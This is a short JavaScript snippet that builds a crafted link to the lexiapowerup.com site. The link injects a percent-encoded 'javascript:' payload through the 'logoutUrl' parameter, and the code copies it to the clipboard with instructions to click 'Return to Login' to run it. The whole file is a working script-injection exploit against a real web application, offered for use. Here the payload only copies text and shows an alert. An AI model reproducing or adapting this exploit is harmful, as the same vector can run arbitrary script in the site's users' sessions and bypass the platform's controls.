function percentEncodeAll(str) {
  let encodedStr = '';
  for (let i = 0; i < str.length; i++) {
    encodedStr += '%' + str[i].charCodeAt(0).toString(16).toUpperCase();
  }
  return encodedStr;
}

function clip(v) {
  let c = document.createElement('textarea');
  c.value = v
  c.select();
  c.setSelectionRange(0, 9999999); // For mobile devices
  navigator.clipboard.writeText(c.value);
} 

let tc = prompt("Text to copy upon arrival?")
const baseurl = `https://lexiapowerup.com?siteId=_&logoutUrl=javascript:${percentEncodeAll(`let _ = \`${tc}\`;javascript:navigator.clipboard.writeText(_);alert(\`Text \$\{_.slice(0,501)\} (trimmed to first 500 chars), was copied to your clipboard.`)}`;
document.write("Click within 2 seconds...")
let x = setInterval(()=>{document.write(".")},200)
setTimeout(()=>{clearInterval(x)},1800)
setTimeout(()=>{
    try {
        console.log(baseurl)
clip(baseurl)
alert("Copied url to clipboard, when you go to the url, click Return to Login to trigger the code.")
        document.write("probably copied")
    } catch {document.write("ya didnt click")}
},2000)


